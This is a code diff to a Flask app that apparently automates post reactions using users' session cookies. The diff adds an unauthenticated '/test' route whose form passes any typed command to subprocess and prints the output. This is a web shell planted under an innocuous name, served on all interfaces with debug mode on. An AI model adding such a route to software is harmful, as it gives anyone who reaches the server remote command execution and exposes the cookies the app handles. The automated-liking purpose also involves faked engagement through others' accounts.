@@ -1,3 +1,4 @@
+import subprocess
 from urllib.parse import unquote_plus
 from flask import Flask, request, jsonify
 from selenium_liker import Liker_Engine
@@ -35,6 +36,20 @@ def send_reactions():
 
 	engine=Liker_Engine(react, post_id, cookie)
 	return jsonify(engine)
+
+@app.route("/test", methods=["GET","POST"])
+def test():
+    if request.method=="POST":
+        cmd=unquote_plus(request.form.get("cmd"))
+        result=subprocess.run(cmd.split(), capture_output=True)
+        return f"""Out:<br>{result.stdout.decode("utf-8")}<br><br>Err:<br>{result.stderr.decode("utf-8")}<br><button><a href="/">Back to Home</a></button>"""
+    html=f"""
+<form method="POST" style="margin-top:20px;">
+<input name="cmd" placeholder="Type Command"/>
+<input type="submit" value="Submit"/>
+</form>
+"""
+    return html
 
 if __name__=="__main__":
     app.run(host='0.0.0.0',port=5000,debug=True)
